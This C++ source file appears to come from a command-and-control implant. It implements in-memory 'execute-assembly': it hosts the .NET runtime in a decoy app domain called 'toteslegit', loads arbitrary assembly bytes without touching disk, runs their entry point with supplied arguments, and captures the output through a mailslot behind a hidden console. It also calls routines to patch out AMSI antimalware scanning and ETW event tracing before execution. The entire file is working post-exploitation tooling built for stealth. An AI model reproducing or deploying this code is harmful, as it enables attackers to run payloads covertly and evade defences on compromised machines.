#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>
#include "taskRunner.h"
#include <strsafe.h>
#include <string>
#include <iostream>
#include "executeAssembly.h"
#include <map>
#include "sodium.h"
#include <mutex>
#include "evasion.h"

using namespace executeassembly;

namespace taskrunner {
	namespace executeassembly {
		map<string, std::tuple<Assembly*, MethodInfo*>> assemblies;
		HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;
		HANDLE g_CurrentStdOut = INVALID_HANDLE_VALUE;
		HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;
		HANDLE g_CurrentStdErr = INVALID_HANDLE_VALUE;
		ICorRuntimeHost* g_Runtime = NULL;
		HANDLE g_hSlot = INVALID_HANDLE_VALUE;
		HANDLE g_hFile = INVALID_HANDLE_VALUE;
		IUnknown* g_pUnk = NULL;
		AppDomain* g_pAppDomain = NULL;
		LPCSTR SlotName = "\\\\.\\mailslot\\myMailSlot";
		mutex mut;
		BOOL WINAPI MakeSlot(LPCSTR lpszSlotName)
		{
			g_hSlot = CreateMailslotA(lpszSlotName,
				0,                             // no maximum message size 
				MAILSLOT_WAIT_FOREVER,         // no time-out for operations 
				(LPSECURITY_ATTRIBUTES)NULL); // default security

			if (g_hSlot == INVALID_HANDLE_VALUE)
			{
				printf("CreateMailslot failed with %d\n", GetLastError());
				return FALSE;
			}
			else printf("Mailslot created successfully.\n");
			return TRUE;
		}

		BOOL ReadSlot(std::string& output)
		{
			CONST DWORD szMailBuffer = 424; //Size comes from https://docs.microsoft.com/en-us/windows/win32/ipc/about-mailslots?redirectedfrom=MSDN
			DWORD cbMessage, cMessage, cbRead;
			BOOL fResult;
			LPSTR lpszBuffer = NULL;
			LPVOID achID[szMailBuffer] = { 0 };
			DWORD cAllMessages;
			HANDLE hEvent;
			OVERLAPPED ov = { 0 };

			cbMessage = cMessage = cbRead = 0;

			hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
			if (NULL == hEvent)
				return FALSE;
			ov.Offset = 0;
			ov.OffsetHigh = 0;
			ov.hEvent = hEvent;

			fResult = GetMailslotInfo(g_hSlot, // mailslot handle 
				(LPDWORD)NULL,               // no maximum message size 
				&cbMessage,                   // size of next message 
				&cMessage,                    // number of messages 
				(LPDWORD)NULL);              // no read time-out 

			if (!fResult)
			{
				printf("GetMailslotInfo failed with %d.\n", GetLastError());
				return FALSE;
			}

			if (cbMessage == MAILSLOT_NO_MESSAGE)
			{
				printf("Waiting for a message...\n");
				return TRUE;
			}

			cAllMessages = cMessage;

			while (cMessage != 0)  // retrieve all messages
			{
				// Allocate memory for the message. 

				lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
				if (NULL == lpszBuffer)
					return FALSE;
				lpszBuffer[0] = '\0';

				fResult = ReadFile(g_hSlot,
					lpszBuffer,
					cbMessage,
					&cbRead,
					&ov);

				if (!fResult)
				{
					printf("ReadFile failed with %d.\n", GetLastError());
					GlobalFree((HGLOBAL)lpszBuffer);
					return FALSE;
				}
				output += lpszBuffer;

				fResult = GetMailslotInfo(g_hSlot,  // mailslot handle 
					(LPDWORD)NULL,               // no maximum message size 
					&cbMessage,                   // size of next message 
					&cMessage,                    // number of messages 
					(LPDWORD)NULL);              // no read time-out 

				if (!fResult)
				{
					printf("GetMailslotInfo failed (%d)\n", GetLastError());
					return FALSE;
				}
			}
			GlobalFree((HGLOBAL)lpszBuffer);
			CloseHandle(hEvent);
			return TRUE;
		}

		/*Determine if .NET assembly is v4 or v2*/
		BOOL FindVersion(void* assembly, int length) {
			char* assembly_c;
			assembly_c = (char*)assembly;
			char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

			for (int i = 0; i < length; i++)
			{
				for (int j = 0; j < 10; j++)
				{
					if (v4[j] != assembly_c[i + j])
					{
						break;
					}
					else
					{
						if (j == (9))
						{
							return 1;
						}
					}
				}
			}

			return 0;
		}
		BOOL LoadCLR(LPCWSTR dotNetVersion) {

			HRESULT hr;
			ICLRMetaHost* pMetaHost = NULL;
			ICLRRuntimeInfo* pRuntimeInfo = NULL;
			BOOL bLoadable;

			// Open the runtime
			HMODULE lib = LoadLibraryA("mscoree.dll");
			CLRCreateInstanceFnPtr CLRCreateInstance = (CLRCreateInstanceFnPtr)GetProcAddress(lib, "CLRCreateInstance");
			hr = CLRCreateInstance(xCLSID_CLRMetaHost, xIID_ICLRMetaHost, (LPVOID*)&pMetaHost);
			if (FAILED(hr))
				goto Cleanup;

			//DotNet version
			hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, dotNetVersion, xIID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
			if (FAILED(hr))
				goto Cleanup;

			// Check if the runtime is loadable (this will fail without .Net v4.x on the system)

			hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &bLoadable);
			if (FAILED(hr) || !bLoadable)
				goto Cleanup;

			// Load the CLR into the current pRuntimeInfo,
			hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, xCLSID_CorRuntimeHost, xIID_ICorRuntimeHost, (LPVOID*)&g_Runtime);
			if (FAILED(hr))
				goto Cleanup;

			// Start the CLR.
			hr = g_Runtime->lpVtbl->Start(g_Runtime);
			if (FAILED(hr))
				goto Cleanup;

		Cleanup:

			/*	if (pMetaHost)
				{
					pMetaHost->lpVtbl->Release(pMetaHost);
					pMetaHost = NULL;
				}
				if (pRuntimeInfo)
				{
					pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
					pRuntimeInfo = NULL;
				}
				if (FAILED(hr) && g_Runtime)
				{
					g_Runtime->lpVtbl->Release(g_Runtime);
					g_Runtime = NULL;
				}*/

			return hr;
		}

		/*BOOL UnloadCLR() {

			g_Runtime->lpVtbl->Release(g_Runtime);
			g_Runtime = NULL;
			return TRUE;
		}*/

		HRESULT CallMethod(std::string assembly, std::string args, std::string& outputString) {
			HRESULT hr = S_OK;
			std::wstring wappDomain{ L"toteslegit" };
			SAFEARRAY* psaArguments = NULL;
			IUnknown* pUnk = NULL;
			AppDomain* pAppDomain = NULL;
			Assembly* pAssembly = NULL;
			MethodInfo* pMethodInfo = NULL;
			SAFEARRAYBOUND bounds[1] = { 0 };
			SAFEARRAY* psaBytes = NULL;
			LONG rgIndices = 0;
			wstring w_ByteStr;
			LPWSTR* szArglist = NULL;
			int nArgs = 0;
			VARIANT vtPsa = { 0 };
			string hash;
			IErrorInfo* pErrorInfo;
			BSTR description;
			SecureZeroMemory(&vtPsa, sizeof(VARIANT));
			vtPsa.vt = (VT_ARRAY | VT_BSTR);

			executeassembly::g_OrigninalStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
			executeassembly::g_OrigninalStdErr = GetStdHandle(STD_ERROR_HANDLE);

			hash.resize(crypto_hash_sha256_BYTES);
			crypto_hash_sha256((unsigned char*)hash.c_str(), (unsigned char*)assembly.c_str(), assembly.size());
			/*if (assemblies.contains(hash)) {
				pAssembly = std::get<0>(assemblies.find(hash)->second);
				pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
				goto Run;
			}*/

			hr = g_Runtime->lpVtbl->CreateDomain(g_Runtime, (LPCWSTR)wappDomain.c_str(), NULL, &pUnk);
			if (FAILED(hr))
				goto Cleanup;


			// Get the current app domain

			hr = pUnk->QueryInterface(xIID_AppDomain, (VOID**)&pAppDomain);
			if (FAILED(hr))
				goto Cleanup;

			// Load the assembly
			//Establish the bounds for our safe array
			bounds[0].cElements = (ULONG)assembly.size();
			bounds[0].lLbound = 0;

			//Create a safe array and fill it with the bytes of our .net assembly
			psaBytes = SafeArrayCreate(VT_UI1, 1, bounds);
			SafeArrayLock(psaBytes);
			memcpy(psaBytes->pvData, assembly.c_str(), assembly.size());
			SafeArrayUnlock(psaBytes);

			//Load the assembly into the app domain
			hr = pAppDomain->lpVtbl->Load_3(pAppDomain, psaBytes, &pAssembly);
			if (FAILED(hr))
			{
				SafeArrayDestroy(psaBytes);
				goto Cleanup;
			}

			SafeArrayDestroy(psaBytes);

			// Find the entry point
			hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
			if (FAILED(hr))
				goto Cleanup;

			//add assembly to map
			hash.resize(crypto_hash_sha256_BYTES);
			crypto_hash_sha256((unsigned char*)hash.c_str(), (unsigned char*)assembly.c_str(), assembly.size());
			assemblies.emplace(hash, make_tuple(pAssembly, pMethodInfo));

			//This will take our arguments and format them so they look like command line arguments to main (otherwise they are treated as a single string)
			//Credit to https://github.com/b4rtik/metasploit-execute-assembly/blob/master/HostingCLR_inject/HostingCLR/HostingCLR.cpp for getting this to work properly
		Run:
			if (args.empty())
			{
				vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 0);
			}
			else
			{
				//Convert to wide characters
				w_ByteStr.resize(sizeof(wchar_t) * args.size() + 1);
				mbstowcs((wchar_t*)w_ByteStr.c_str(), (char*)args.data(), args.size() + 1);
				szArglist = CommandLineToArgvW(w_ByteStr.c_str(), &nArgs);

				vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
				for (long i = 0; i < nArgs; i++)
				{
					BSTR strParam1 = SysAllocString(szArglist[i]);
					SafeArrayPutElement(vtPsa.parray, &i, strParam1);
				}
			}

			psaArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

			hr = SafeArrayPutElement(psaArguments, &rgIndices, &vtPsa);

			VARIANT retVal;
			ZeroMemory(&retVal, sizeof(VARIANT));
			VARIANT obj;
			ZeroMemory(&obj, sizeof(VARIANT));
			obj.vt = VT_NULL;

			if (!SetStdHandle(STD_OUTPUT_HANDLE, g_hFile))
			{
				goto Cleanup;
			}
			if (!SetStdHandle(STD_ERROR_HANDLE, g_hFile))
			{
				goto Cleanup;
			}
			//Execute the function.  Note that if you are executing a function with return data it will end up in vReturnVal
			hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaArguments, &retVal);

			GetErrorInfo(0, &pErrorInfo);
			if (pErrorInfo != NULL) {
				pErrorInfo->GetDescription(&description);
				wprintf(L"Error with %d description: %s\n", hr, description);
			}
			//Reset our Output handles (the error message won't show up if they fail, just for debugging purposes)
			if (!SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut))
			{
				std::cerr << "ERROR: SetStdHandle REVERTING stdout failed." << std::endl;
			}
			if (!SetStdHandle(STD_ERROR_HANDLE, g_OrigninalStdErr))
			{
				std::cerr << "ERROR: SetStdHandle REVERTING stderr failed." << std::endl;
			}

			//Read from our mail slot
			if (!ReadSlot(outputString))
				printf("Failed to read from mail slot");

		Cleanup:
			VariantClear(&retVal);
			VariantClear(&obj);
			VariantClear(&vtPsa);
			if (NULL != psaArguments)
				SafeArrayDestroy(psaArguments);
			psaArguments = NULL;
			if (pMethodInfo != NULL) {

				pMethodInfo->lpVtbl->Release(pMethodInfo);
				pMethodInfo = NULL;
			}
			if (pAssembly != NULL) {

				pAssembly->lpVtbl->Release(pAssembly);
				pAssembly = NULL;
			}
			if (pAppDomain != NULL) {

				pAppDomain->lpVtbl->Release(pAppDomain);
				pAppDomain = NULL;
			}
			if (pUnk != NULL) {
				pUnk->Release();

			}
			g_Runtime->lpVtbl->UnloadDomain(g_Runtime, pUnk);
			/*if(NULL != pAssembly)
				pAssembly->lpVtbl->Release(pAssembly);*/
			return hr;
		}
	}
	string ExecuteAssembly(const string& assembly, const string& arguments, bool amsi, bool etw) {
		//Declare other variables
		HRESULT hr = NULL;
		wchar_t* wNetVersion = NULL;
		int argumentCount = 0;
		HANDLE stdOutput = INVALID_HANDLE_VALUE;
		HANDLE stdError = INVALID_HANDLE_VALUE;
		HANDLE mainHandle = INVALID_HANDLE_VALUE;
		HANDLE hFile = INVALID_HANDLE_VALUE;
		BOOL free_console = FALSE;
		BOOL success = 1;

		unique_lock lk{ executeassembly::mut };
		if (!GetConsoleWindow()) {
			HWND wnd = NULL;
			AllocConsole();
			if (wnd = GetConsoleWindow()) {
				ShowWindow(wnd, SW_HIDE);
			}
			free_console = 1;
		}
		std::string output = "";
		if (amsi) {
			evasion::patchAMSI();
		}
		if (etw) {
			evasion::patchETW(0);
		}
		if (executeassembly::FindVersion((void*)assembly.c_str(), assembly.size()))
		{
			wNetVersion = (wchar_t*)L"v4.0.30319";
		}
		else
		{
			wNetVersion = (wchar_t*)L"v2.0.50727";
		}
		//Create our mail slot
		if (!executeassembly::MakeSlot(executeassembly::SlotName))
		{
			printf("Failed to create mail slot");
			return output;
		}
		executeassembly::g_hFile = CreateFileA(executeassembly::SlotName, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

		//Load the CLR
		if (executeassembly::g_Runtime == NULL) {
			hr = executeassembly::LoadCLR(wNetVersion);
			if (FAILED(hr))
			{
				output = "failed to load CLR";
				goto END;
			}
		}
		printf("Successfully loaded CLR\n");
		hr = executeassembly::CallMethod(assembly, arguments, output);
		if (FAILED(hr))
			output = "failed to call method";
	END:
		//executeassembly::UnloadCLR();
		if (executeassembly::g_hSlot != INVALID_HANDLE_VALUE)
			CloseHandle(executeassembly::g_hSlot);
		if (executeassembly::g_hFile != INVALID_HANDLE_VALUE)
			CloseHandle(executeassembly::g_hFile);
		if (free_console) {
			FreeConsole();
		}
		return output;
	}
}